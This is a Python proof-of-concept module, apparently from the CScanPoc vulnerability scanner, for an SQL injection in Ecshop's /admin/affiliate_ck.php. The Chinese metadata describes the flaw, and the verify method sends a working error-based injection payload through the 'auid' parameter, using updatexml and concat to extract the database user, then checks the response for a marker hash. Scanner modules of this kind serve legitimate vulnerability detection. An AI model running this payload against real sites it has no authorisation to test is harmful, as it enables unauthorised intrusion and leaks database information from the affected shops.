# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0024'  # 平台漏洞编号，留空
    name = 'Ecshop  /admin/affiliate_ck.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-08-05'  # 漏洞公布时间
    desc = '''
        /admin/affiliate_ck.php (207-350)是整个get_affiliate_ck函数。
        其中发现对$_GET['auid']的取值仅仅是直接传入就加入了sql语句，只要满足了$_GET['auid']不为空就可以直接代入，导致了sql注入发生
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4050/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd87cb096-01d8-4df3-af21-e720dd935924'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/admin/affiliate_ck.php?act=list&auid=3+and+updatexml(1,concat(0x7e,concat(md5(c),0x3a,user()),0x7e),1)"
            data = "status=1&order_sn=2"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
